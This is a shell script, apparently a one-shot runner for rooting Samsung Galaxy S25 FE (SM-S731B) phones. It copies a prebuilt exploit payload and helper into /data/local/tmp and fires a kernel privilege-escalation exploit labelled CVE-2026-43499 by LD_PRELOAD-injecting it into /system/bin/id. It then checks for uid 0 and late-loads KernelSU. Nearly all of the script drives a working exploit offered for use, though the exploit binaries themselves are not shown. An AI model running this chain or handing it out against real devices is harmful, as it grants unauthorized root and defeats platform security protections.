#!/system/bin/sh
#
# rmg.sh - Root My Galaxy one-shot runner for SM-S731B (r13s)
#
# Supports both Galaxy S25 FE International builds:
#   * S731BXXU9CZIF  One UI 9, kernel 6.1.162  -> r13s-S731BXXU9CZIF
#   * S731BXXS9BZH1  One UI 8, kernel 6.1.157  -> r13s-S731BXXS9BZH1
# The build is selected from `uname -r`, so the same folder works after an OTA.
#
# RUN THIS INSIDE A rish (Shizuku) SHELL, not from plain Termux:
#
#   rish
#   sh /sdcard/RMG/rmg.sh
#
# Why: /data/local/tmp is mode 771 owned by shell:shell, so only the shell uid
# can write there. rish gives you uid 2000 / u:r:shell:s0, the same context the
# validated USB `adb shell` run used. Plain Termux (an app uid) cannot write it.
#
# The script:
#   1. picks the payload + ksud matching the running kernel
#   2. verifies their SHA-256 against the bundled SHA256SUMS
#   3. copies payload + helper + ksud from /sdcard/RMG to /data/local/tmp
#   4. waits out the 120s post-boot quiet window
#   5. runs the CVE-2026-43499 exploit (skipped if root is already live)
#   6. verifies uid 0
#   7. stages ksud and performs the KernelSU late-load
#
# Root is per-boot, and Shizuku drops on reboot. Re-run after every reboot.

set -u

SRC=${RMG_SRC:-/sdcard/RMG}
TMP=/data/local/tmp

HELPER_SRC=$SRC/cve-2026-43499-root
HELPER=$TMP/cve-2026-43499-root
# su_daemon.c hardcodes this exact path for the late-load bind mount.
KSUD=$TMP/ksud-s25u-kdp

PAYLOAD=$TMP/cve-2026-43499-app.so
SUMS=$SRC/SHA256SUMS

QUIET_WINDOW=${RMG_QUIET_WINDOW:-120}

say() { printf '%s\n' "$*"; }
die() { printf '[!] %s\n' "$*" >&2; exit 1; }

usage() {
    cat <<'EOF'
Usage: sh /sdcard/RMG/rmg.sh [-h]

Must be run inside a rish (Shizuku) shell, as the shell uid.

Environment overrides:
  RMG_SRC            source directory        (default /sdcard/RMG)
  RMG_QUIET_WINDOW   post-boot wait seconds  (default 120)
  RMG_TARGET         force a target instead of detecting it, for example
                     r13s-S731BXXU9CZIF or r13s-S731BXXS9BZH1
  RMG_SKIP_SUMS=1    skip the SHA-256 check of the staged payload and ksud

The exploit's own timing comes from the compiled profile
(attempt timeout 2200s, P0 timeout 1200s, 1 attempt per boot); this script
deliberately does not override those.
EOF
}

case "${1:-}" in
    -h|--help) usage; exit 0 ;;
esac

# ------------------------------------------------------------------ preflight
uid=$(id -u)
if [ "$uid" != "2000" ]; then
    die "running as uid=$uid, need uid 2000 (shell).
    Enter a Shizuku shell first:   rish
    then re-run:                   sh $0"
fi

say "[*] uid=$(id -u) context=$(id -Z 2>/dev/null || echo '?')"

# Pick the payload/module pair that matches the running kernel. The two builds
# have different kernel layouts, so mixing them will not work.
kernel_release=$(uname -r)
kernel_ver=${kernel_release%%-*}

if [ -n "${RMG_TARGET:-}" ]; then
    target=$RMG_TARGET
    say "[*] target forced by RMG_TARGET: $target"
else
    case "$kernel_ver" in
        6.1.162) target=r13s-S731BXXU9CZIF ;;
        6.1.157) target=r13s-S731BXXS9BZH1 ;;
        *) die "unsupported kernel release '$kernel_release'.
    This bundle carries payloads for:
      6.1.162 -> r13s-S731BXXU9CZIF  (S731BXXU9CZIF, One UI 9)
      6.1.157 -> r13s-S731BXXS9BZH1  (S731BXXS9BZH1)
    Set RMG_TARGET to override the selection." ;;
    esac
fi

case "$target" in
    r13s-S731BXXU9CZIF)  expected_ver=6.1.162 ;;
    r13s-S731BXXS9BZH1)  expected_ver=6.1.157 ;;
    *) die "unknown RMG_TARGET '$target'" ;;
esac

if [ "$kernel_ver" != "$expected_ver" ]; then
    say "[!] warning: kernel is $kernel_ver but target $target expects $expected_ver"
fi

model=$(getprop ro.product.model 2>/dev/null || echo '?')
if [ "$model" != "SM-S731B" ]; then
    die "this bundle is for SM-S731B only, but ro.product.model is '$model'"
fi

say "[*] kernel $kernel_release  model $model"
say "[*] target $target"

PAYLOAD_SRC=$SRC/payload-$target.so
KSUD_SRC=$SRC/ksud-$target-kdp

[ -d "$SRC" ]        || die "missing source directory $SRC"
[ -f "$PAYLOAD_SRC" ] || die "missing $PAYLOAD_SRC"
[ -f "$HELPER_SRC" ]  || die "missing $HELPER_SRC"
[ -f "$KSUD_SRC" ]    || die "missing $KSUD_SRC"

# Log beside the sources when that is writable, otherwise in /data/local/tmp.
LOG=$SRC/rmg-run.log
if ! : >"$LOG" 2>/dev/null; then
    LOG=$TMP/rmg-run.log
fi

# ------------------------------------------------------------------- staging
say "[*] copying payload and helper to $TMP"
cp -f "$PAYLOAD_SRC" "$PAYLOAD" || die "copy payload failed"
cp -f "$HELPER_SRC"  "$HELPER"  || die "copy helper failed"
chmod 755 "$HELPER" "$PAYLOAD" || die "chmod failed"

# ----------------------------------------------------------------- integrity
if [ "${RMG_SKIP_SUMS:-0}" != "1" ] && [ -f "$SUMS" ] && command -v sha256sum >/dev/null 2>&1; then
    say "[*] verifying SHA-256"
    for f in "$PAYLOAD_SRC" "$HELPER_SRC" "$KSUD_SRC"; do
        base=$(basename "$f")
        # the helper is shared, so it is listed once under its own name
        want=$(awk -v n="$base" '$2 == n { print $1 }' "$SUMS")
        if [ -z "$want" ]; then
            say "[!] no checksum for $base in SHA256SUMS, skipping"
            continue
        fi
        got=$(sha256sum "$f" | cut -d' ' -f1)
        [ "$got" = "$want" ] || die "checksum mismatch for $base
    expected $want
    got      $got"
        say "[+] $base ok"
    done
else
    say "[*] SHA-256 check skipped"
fi

root_is_live() {
    case "$("$HELPER" -c 'id' 2>/dev/null || true)" in
        *"uid=0"*) return 0 ;;
        *)         return 1 ;;
    esac
}

ksu_is_loaded() {
    grep -q '^kernelsu ' /proc/modules 2>/dev/null
}

if ksu_is_loaded; then
    say "[+] kernelsu already loaded - nothing to do"
    exit 0
fi

# ------------------------------------------------------------------- exploit
if root_is_live; then
    say "[+] root already live, skipping exploit"
else
    uptime_sec=$(cut -d. -f1 /proc/uptime)
    if [ "$uptime_sec" -lt "$QUIET_WINDOW" ]; then
        wait=$((QUIET_WINDOW - uptime_sec))
        say "[*] uptime ${uptime_sec}s - waiting ${wait}s for the quiet window"
        sleep "$wait"
    fi

    say "[*] running exploit (probabilistic; may take a few minutes)"
    say "[*] log: $LOG"
    say "[*] live output below - KernelSnitch may cycle several times before landing"
    say ""

    # Stream to the console while also capturing the log, so a slow run does
    # not look like a hang. `id` still exits normally underneath the preload.
    CVE43499_ROOT_HELPER="$HELPER" LD_PRELOAD="$PAYLOAD" \
        /system/bin/id >"$LOG" 2>&1 &
    exploit_pid=$!
    tail -f "$LOG" 2>/dev/null &
    tail_pid=$!
    wait "$exploit_pid"
    exploit_rc=$?
    kill "$tail_pid" 2>/dev/null || true
    wait "$tail_pid" 2>/dev/null || true
    say ""

    if ! grep -q 'exploit completed' "$LOG" || ! grep -q 'done=1 root=1' "$LOG"; then
        say "[-] exploit did not report success (id exit=$exploit_rc). Tail of $LOG:"
        tail -n 25 "$LOG"
        say ""
        say "[!] This profile uses a fresh-P0 session: one attempt per boot."
        say "    Reboot the device, restart Shizuku, then re-run this script."
        exit 1
    fi
    say "[+] exploit reported success"
fi

root_is_live || die "root not reachable after exploit - check $LOG"
say "[+] root verified: $("$HELPER" -c 'id' 2>/dev/null)"

# ------------------------------------------------------------------ late-load
say "[*] staging ksud at $KSUD"
cp -f "$KSUD_SRC" "$KSUD" || die "copy ksud failed"
chmod 755 "$KSUD"         || die "chmod ksud failed"

say "[*] running KernelSU late-load"
"$HELPER" --late-load || die "late-load failed - check the output above"

if ksu_is_loaded; then
    say "[+] kernelsu module is live"
else
    say "[!] late-load returned success but the module is not in /proc/modules"
fi

say ""
say "[+] done. Open KernelSU Manager (me.weishu.kernelsu) - it should show"
say "    'Working <LKM> [Jailbreak mode]'. Root is per-boot: re-run after reboot."
